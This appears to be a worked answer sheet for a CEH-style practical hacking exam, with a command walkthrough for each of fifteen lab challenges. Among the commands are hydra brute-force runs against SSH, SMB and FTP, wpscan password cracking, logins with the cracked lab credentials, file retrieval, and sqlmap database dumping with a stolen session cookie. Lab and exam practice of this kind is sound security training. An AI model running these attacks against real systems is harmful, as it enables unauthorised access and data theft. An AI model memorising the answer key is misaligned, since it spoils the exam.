#------------------------------#


# PART III - Challenge 1  💬ANSWER: 172.30.10.200💬
#### C:\Users\Documents\$_Jack.pcapng 
### FILTER: tcp.flags.reset == 1
### PATH: Statistics → Conversations → TCP
### INFO: Source → 172.30.10.200

# ⚠️ IMPORTANT COMMANDS
### FILTER: tcp.flags.reset == 1 && tcp.len == 0 && ip.dst == 172.30.10.200  # envio de flag reset com payload vazio
### FILTER: tcp.flags.reset == 1 && tcp.len == 0 && ip.src == 172.30.10.200 
### FILTER: tcp.analysis.retransmission || tcp.analysis.out_of_order # Sequência de sessão quebrada


#------------------------------#


# PART III - Challenge 2 💬ANSWER: lee/test💬
#### C:\Users\Downloads\Intercep_$niffer.pcapng 
### FILTER: http.request.method == POST
#### INFO: POST /login.aspx HTTP/1.1 (application/x-www-form-urlencoded)
#### HTML Form URL Encoded: application/x-www-form-urlencoded
####    Form item: "txtusername" == "lee"
####    Form item: "txtpwd" == "test"

# ⚠️ IMPORTANT COMMANDS
### FILTER: http.request.method == POST && frame contains "txt"
### FILTER: http contains "username" || http contains "password"
### FILTER: tcp.port == 80 && http
### FILTER: http.request && !(http.response)


#------------------------------#


# PART III - Challenge 3  💬ANSWER: 172.30.10.99💬
#### ~/Donwloads/cowrie.log
cat ~/Donwloads/cowrie.log
### INFO: 2024-09-11T01:28:11.805001Z [HoneyPotSSHTransport,1,172.30.10.99] Connection lost after 0 seconds
### INFO: 2024-09-11T01:29:11.805001Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 172.30.10.99:35929 (102.168.10.111:2222) [session: 33295034a52] 
### INFO: 2024-09-11T01:28:11.933069Z [HoneyPotSSHTransport,2,172.30.10.99] Remote SSH version: SSH-2.0-PuTTy_Realese_0.76
### INFO: 2024-09-11T01:28:11.933069Z [HoneyPotSSHTransport,2,172.30.10.99] SSH client hassh fingerprint: 5b7713a9ef2d162b16ea018fa8d40f02


#------------------------------#


# PART III - Challenge 4  💬ANSWER: Apache💬
curl -I certifiedhacker.com
# nmap -script http-headers certifiedhacker.com
# nmap -sV -p 80,443 certifiedhacker.com
### INFO: Apache

# ⚠️ IMPORTANT COMMANDS
# whatweb -a 3 certifiedhacker.com
# nc certifiedhacker.com 80
# http -h certifiedhacker.com
# openssl s_client -connect certifiedhacker.com:443


#------------------------------#


# PART III - Challenge 5  💬ANSWER: i2tr&^72546HJ*💬
hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.101 ssh -u -t 4 -w 5 
### INFO: [22] [ssh] host: 192.168.10.101 login: Martin password: qwerty1234
# ssh Martin@192.168.10.101 
### PASSWORD: qwerty1234

#### ~/Desktop/$ollers.txt
cd Desktop # CONECTADO VIA SSH
dir
type $ollers.txt
### INFO: Password to enter my crypto account: i2tr&^72546HJ*

# ⚠️ IMPORTANT COMMANDS
# hydra -l Martin -P ~/rockyou.txt 192.168.10.101 ssh -u -t 4 -w 5 
# hydra -l Martin -p qwerty1234 192.168.10.101 ssh 
# sshpass -p 'qwerty1234' ssh Martin@192.168.10.101


#------------------------------#


# PART III - Challenge 6  💬ANSWER: 7867721010💬
ftp 192.168.10.111
### USERNAME: nick
### PASSWORD: apple
#### ~/Desktop/w_domain.txt
get Desktop/w_domain.txt # CONECTADO VIA FTP
exit
cat w_domain.com
### INFO: "id":"7867721010"

# ⚠️ IMPORTANT COMMANDS
# ftp ftp://nick:apple@192.168.10.111


#------------------------------#


# PART III - Challenge 7  💬ANSWER: Apache Tomcat/Coyote JSP engine 1.1💬
nmap -sT -sV --version-light -T2 --open --top-ports 200 172.30.10.99
nmap -p 8080 -sV 172.30.10.99
### INFO: 8080/tcp  open  http  Apache Tomcat/Coyote JSP engine 1.1

# ⚠️ IMPORTANT COMMANDS
# nmap -p 8080 -sV --version-light 172.30.10.99
# nmap -p 8080 --script http-title,http-server-header 172.30.10.99
# whatweb -a 3 http://172.30.10.99:8080
# curl -I http://172.30.10.99:8080



#------------------------------#


# PART III - Challenge 8  💬ANSWER: EC-Council💬
hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.101 smb -u -t 4 -w 3
### INFO: [445] [smb] host: 192.168.10.101 login: Martin password: qwerty1234
smbclient -L //192.168.10.101 -U Martin # Listar shares
### PASSWORD: qwerty1234
smbclient //192.168.10.101/Users -U Martin # Conectar
### PASSWORD: qwerty1234

# #### C:\Users\Martin\Music\webpent.txt
cd Martin\Music # CONECTADO VIA SSH
get webpent.txt
exit
cat webpent.txt
### INFO: www.moviescope.com

whatweb www.moviescope.com
### INFO: ..., Meta-Author[EC-Council], ...

# ⚠️ IMPORTANT COMMANDS
# ssh Martin@192.168.10.101
# ### PASSWORD: qwerty1234
# cd Music # CONECTADO VIA SSH
# dir
# type webpent.txt
### INFO: www.moviescope.com


#------------------------------#


# PART III - Challenge 9  💬ANSWER: cros-site scripting (XSS)💬
# PART III - Challenge 10  💬ANSWER: Content Security Policy💬
owasp-zap
### Automated Run → URL to attack: http://www.goodshopping.com → Attack
### Alerts → Vulnerable JS Library
### INFO: Other Info → CVE-2020-11023, CVE-2020-11022, CVE-2015-9251 
### INFO: Reference → https://nvd.nist.gov/vuln/detail/CVE-2012-6708 → Cross-site Scripting (XSS)   
### Alerts → User Controllable HTML Element Attibute (Potential XSS)
### INFO: Description → ... for XSS (cros-site scripting) ... 
### Alerts → Content Security Policy (CSP) Header Not Set
### INFO: Source → Passive (10038 - Content Security Policy (CSP) Header Not Set)


#------------------------------#


# PART III - Challenge 11 💬ANSWER: 36💬toor
sudo su
### PASSWORD: toor
nmap -O --osscan-guess --max-os-tries 1 192.168.10.111 192.168.10.121 192.168.10.144 192.168.10.222
### INFO: Nmap scan report for 192.168.10.144
### INFO: OS details: Microsft Windows Server 2019
hydra -L users.txt -P rockyou.txt 192.168.10.144 ftp -u -t 4 -w 3
### INFO: [21] [ftp] host: 192.168.10.144 login: Parker password: Passw0rd@1234

ftp 192.168.10.144 # NOUTRO TERMINAL
### USERNAME: Parker
### PASSWORD: Passw0rd@1234
#### C:\Users\Parker\Documents\w_report.pdf
get Documents/w_report.pdf # CONECTADO VIA FTP
bye # exit

pdftotext Documents/w_report.pdf report.txt
grep -i "directory listing" report.txt
grep -i "sensitive files" report.txt
### INFO: 12.36 Directory Listing of Sensitive Files

# ⚠️ IMPORTANT COMMANDS
# ftp Parker@192.168.10.144
# ftp ftp://Parker:Passw0rd%401234@192.168.10.144
# lftp -u Parker,Passw0rd@1234 192.168.10.144


#------------------------------#


# PART III - Challenge 12 💬ANSWER: orange1234💬
nmap -p- --open www.cehorg.com
whatweb http://www.cehorg.com:80
whatweb http://www.cehorg.com:8080
#### MOZILLA FIREFOX: http://www.cehorg.com:8080
### INFO: You Projects (2) → CEH, DVWA
whatweb http://www.cehorg.com:8080/CEH
curl -I http://www.cehorg.com:8080/CEH
wpscan --url http://www.cehorg.com:8080/CEH/ --enumerate u # Enumerar usuários
### INFO: User(s) Identified → admin, adam, helen
wpscan --url http://www.cehorg.com:8080/CEH/ -U adam -P rockyou.txt
### INFO: Username: adam, Password: orange1234

# ⚠️ IMPORTANT COMMANDS
# curl -I http://www.cehorg.com:80
# curl -I http://www.cehorg.com:8080
# curl -I http://www.cehorg.com8080/DVWA
# curl -I http://www.cehorg.com:8080/CEH/wp-login.php
# curl http://www.cehorg.com:8080/phpinfo.php
# wget -r -np -nd http://www.cehorg.com:8080/ # 😃
# gobuster dir -u http://www.cehorg.com:8080/ -w /usr/share/wordlists/dirb/common.txt
# gobuster dir -u http://www.cehorg.com:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt
# dirsearch -u http://www.cehorg.com:8080/
# dirsearch -u http://www.cehorg.com:8080/ -e php,txt,html -x 403,404


# go install github.com/hakluke/hakrawler@latest
# go install github.com/projectdiscovery/katana/cmd/katana@latest
# export PATH=$PATH:~/go/bin
# which hakrawler
# which katana
# hakrawler -u http://www.cehorg.com:8080 -d 2
# katana -u http://www.cehorg.com:8080


#------------------------------#


# PART III - Challenge 13 💬ANSWER: 3💬
#### C:\Users\Admin\Videos\www.moviescope.com_09112024_0538.html
#### GOOGLE: file:///C:\Users\Admin\Videos\www.moviescope.com_09112024_0538.html
### INFO: Category → Content Security Policy Configuration     Number of vulnerabilities → 1
### INFO: Category → Clickjacing Protection                    Number of vulnerabilities → 1
### INFO: Category → MIME Type Confusion                       Number of vulnerabilities → 1
### INFO: Number od risk categories = 1 + 1 + 1 = 3


#------------------------------#


# PART III - Challenge 14 💬ANSWER: 5💬
# PART III - Challenge 15 💬ANSWER: 19💬
#### MOZILLA FIREFOX: http://www.moviescope.com/ # Realizar login 
### USERNAME: lee
### PASSWORD: test
### PATH: Contacts → View Profile
### PATH: Ctrl + Shift + I (Developer Tools) → Concole → document.cookie
### INFO: "mscope=WNklabw/oq4=; ui-tabs-1=0"
#### MOZILLA FIREFOX: http://www.moviescope.com/viewprofile.aspx?id=1 
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=WNklabw/oq4=; ui-tabs-1=0" -dbs --batch
### INFO: available databases [9] ... [*] moviescope ...
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=WNklabw/oq4=; ui-tabs-1=0" -D moviescope --tables --batch
### INFO: [11 tables] ... User_Login ...
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=WNklabw/oq4=; ui-tabs-1=0" -D moviescope -T User_Login --dump --batch
### INFO: [5 entries] ... Uid → 5

#### MOZILLA FIREFOX: WASC ID SQL INJECTION 
### INFO: WASC-19
### INFO: http://projects.webappsec.org/w/page/13246963/SQL Injection

# ⚠️ IMPORTANT COMMANDS
# sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=WNklabw/oq4=; ui-tabs-1=0" --sql-query="SELECT COUNT(*) FROM User_Login" --batch
# sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=WNklabw/oq4=; ui-tabs-1=0" --batch --level=1 --risk=1


